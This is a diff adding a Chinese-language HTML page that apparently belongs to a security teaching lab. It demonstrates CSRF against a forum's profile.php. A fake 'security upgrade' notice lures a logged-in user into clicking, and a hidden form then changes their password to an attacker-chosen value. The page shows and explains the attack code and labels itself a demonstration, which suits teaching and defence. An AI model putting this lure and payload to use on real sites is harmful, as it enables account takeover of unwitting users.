@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>系统安全升级通知</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .attack-container {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+            width: 100%;
+            max-width: 580px;
+        }
+        .nav-bar {
+            background: #fff;
+            padding: 12px 20px;
+            border-bottom: 1px solid #f0f0f0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .nav-bar .title {
+            color: #667eea;
+            font-weight: 600;
+            font-size: 0.95em;
+        }
+        .nav-bar a {
+            color: #666;
+            text-decoration: none;
+            padding: 6px 14px;
+            border-radius: 6px;
+            transition: all 0.3s;
+            font-size: 0.9em;
+        }
+        .nav-bar a:hover {
+            background: #667eea;
+            color: white;
+        }
+        .attack-header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 35px 25px;
+            text-align: center;
+        }
+        .attack-header .icon {
+            font-size: 3.5em;
+            margin-bottom: 12px;
+        }
+        .attack-header h1 {
+            font-size: 1.6em;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        .attack-header p {
+            opacity: 0.95;
+            font-size: 1em;
+        }
+        .attack-body {
+            padding: 25px;
+        }
+        .notice-box {
+            background: #fff9e6;
+            border: 1px solid #ffe58f;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 18px;
+        }
+        .notice-box h3 {
+            color: #d48806;
+            font-size: 1em;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .notice-box ul {
+            color: #ad6b00;
+            margin-left: 20px;
+            font-size: 0.9em;
+            line-height: 1.6;
+        }
+        .notice-box li {
+            margin: 5px 0;
+        }
+        .warning-box {
+            background: #fff5f5;
+            border: 1px solid #feb2b2;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 18px;
+            color: #c53030;
+        }
+        .warning-box h3 {
+            font-size: 1em;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .warning-box ul {
+            margin-left: 20px;
+            font-size: 0.9em;
+            line-height: 1.6;
+        }
+        .warning-box li {
+            margin: 5px 0;
+        }
+        .param-editor {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 18px;
+        }
+        .param-editor h4 {
+            color: #333;
+            margin-bottom: 12px;
+            font-size: 0.95em;
+            font-weight: 600;
+        }
+        .param-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+        .param-group label {
+            display: block;
+            color: #666;
+            font-size: 0.85em;
+            margin-bottom: 5px;
+        }
+        .param-group input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 0.9em;
+            transition: border-color 0.3s;
+        }
+        .param-group input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        .code-section {
+            background: #1e1e1e;
+            border-radius: 8px;
+            margin-bottom: 18px;
+            overflow: hidden;
+        }
+        .code-header {
+            background: #2d2d2d;
+            padding: 12px 15px;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .code-header h3 {
+            font-size: 0.9em;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .code-header .btn-toggle {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.85em;
+            transition: background 0.3s;
+        }
+        .code-header .btn-toggle:hover {
+            background: #764ba2;
+        }
+        .code-body {
+            padding: 15px;
+            display: none;
+        }
+        .code-body.show {
+            display: block;
+        }
+        .code-body textarea {
+            width: 100%;
+            background: #1e1e1e;
+            color: #f8f8f2;
+            border: none;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85em;
+            line-height: 1.5;
+            resize: vertical;
+            min-height: 180px;
+            padding: 0;
+        }
+        .code-body textarea:focus {
+            outline: none;
+        }
+        .info-box {
+            background: #e8f4f8;
+            border: 1px solid #bee3f8;
+            border-radius: 8px;
+            padding: 12px 15px;
+            color: #2c5282;
+            margin-bottom: 18px;
+            font-size: 0.9em;
+        }
+        .info-box h4 {
+            margin-bottom: 8px;
+            font-size: 0.95em;
+        }
+        .info-box p {
+            margin: 4px 0;
+        }
+        .info-box code {
+            background: rgba(255,255,255,0.5);
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: monospace;
+            font-size: 0.9em;
+        }
+        .btn-upgrade {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-upgrade:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102,126,234,0.4);
+        }
+        .btn-upgrade:active {
+            transform: translateY(0);
+        }
+        .hidden-form {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="attack-container">
+        <div class="nav-bar">
+            <span class="title">🎯 CSRF攻击演示</span>
+            <a href="../../index.php">🏠 返回主页</a>
+        </div>
+        
+        <div class="attack-header">
+            <div class="icon">🔒</div>
+            <h1>系统安全升级通知</h1>
+            <p>为了您的账户安全，请及时更新密码</p>
+        </div>
+        
+        <div class="attack-body">
+            <div class="notice-box">
+                <h3>📢 重要通知</h3>
+                <ul>
+                    <li>系统检测到部分账户存在安全风险</li>
+                    <li>为了保障您的账户安全，需要重置密码</li>
+                    <li>新密码将自动设置为：<strong id="displayPassword">hacked123</strong></li>
+                    <li>点击下方按钮完成安全升级</li>
+                </ul>
+            </div>
+            
+            <div class="warning-box">
+                <h3>⚠️ 这是一次CSRF攻击演示</h3>
+                <p>当您点击"立即升级"按钮时，实际上会执行以下操作：</p>
+                <ul>
+                    <li>向论坛系统发送隐藏的密码修改请求</li>
+                    <li>将您的密码修改为 <strong id="displayPassword2">hacked123</strong></li>
+                    <li>由于您已登录论坛系统，请求会成功执行</li>
+                    <li>攻击者随后可以用新密码登录您的账户</li>
+                </ul>
+            </div>
+            
+            <div class="param-editor">
+                <h4>🔧 攻击参数配置（可自由修改）</h4>
+                <div class="param-row">
+                    <div class="param-group">
+                        <label>新密码</label>
+                        <input type="text" id="new_password" value="hacked123">
+                    </div>
+                    <div class="param-group">
+                        <label>确认密码</label>
+                        <input type="text" id="confirm_password" value="hacked123">
+                    </div>
+                </div>
+            </div>
+            
+            <div class="code-section">
+                <div class="code-header">
+                    <h3>💻 核心攻击代码</h3>
+                    <button class="btn-toggle" onclick="toggleCode()">显示/隐藏</button>
+                </div>
+                <div class="code-body" id="codeBody">
+                    <textarea id="attackCode" readonly></textarea>
+                </div>
+            </div>
+            
+            <div class="info-box">
+                <h4>🎯 攻击原理</h4>
+                <p>攻击者构造了一个看似合法的页面，诱导用户点击</p>
+                <p>目标：<code>profile.php</code> 的密码修改接口</p>
+                <p>新密码：<code id="displayPassword3">hacked123</code></p>
+                <p>攻击类型：CSRF（跨站请求伪造）</p>
+            </div>
+            
+            <form id="attackForm" class="hidden-form" method="POST" action="profile.php">
+                <input type="hidden" name="action" value="change_password">
+                <input type="hidden" name="new_password" id="form_new_password" value="hacked123">
+                <input type="hidden" name="confirm_password" id="form_confirm_password" value="hacked123">
+            </form>
+            
+            <button type="button" class="btn-upgrade" onclick="submitAttack()">🔒 立即升级</button>
+        </div>
+    </div>
+    
+    <script>
+        // 初始化代码
+        function initCode() {
+            updateCode();
+        }
+        
+        // 显示/隐藏代码
+        function toggleCode() {
+            const codeBody = document.getElementById('codeBody');
+            codeBody.classList.toggle('show');
+        }
+        
+        // 更新代码显示
+        function updateCode() {
+            const new_password = document.getElementById('new_password').value;
+            const confirm_password = document.getElementById('confirm_password').value;
+            
+            const code = `<!-- 隐藏的攻击表单 -->
+<form id="attackForm" style="display:none" method="POST" action="profile.php">
+    <!-- 关键：没有CSRF Token，攻击可以成功 -->
+    <input type="hidden" name="action" value="change_password">
+    <input type="hidden" name="new_password" value="${new_password}">
+    <input type="hidden" name="confirm_password" value="${confirm_password}">
+</form>
+
+<script>
+// 自动提交表单
+function submitAttack() {
+    document.getElementById('attackForm').submit();
+}
+<\/script>`;
+            
+            document.getElementById('attackCode').value = code;
+        }
+        
+        // 实时更新攻击参数
+        document.getElementById('new_password').addEventListener('input', function() {
+            const value = this.value;
+            document.getElementById('form_new_password').value = value;
+            document.getElementById('confirm_password').value = value;
+            document.getElementById('form_confirm_password').value = value;
+            document.getElementById('displayPassword').textContent = value;
+            document.getElementById('displayPassword2').textContent = value;
+            document.getElementById('displayPassword3').textContent = value;
+            updateCode();
+        });
+        
+        document.getElementById('confirm_password').addEventListener('input', function() {
+            document.getElementById('form_confirm_password').value = this.value;
+            updateCode();
+        });
+        
+        // 提交攻击
+        function submitAttack() {
+            document.getElementById('form_new_password').value = document.getElementById('new_password').value;
+            document.getElementById('form_confirm_password').value = document.getElementById('confirm_password').value;
+            document.getElementById('attackForm').submit();
+        }
+        
+        // 页面加载初始化
+        window.onload = initCode;
+    </script>
+</body>
+</html>
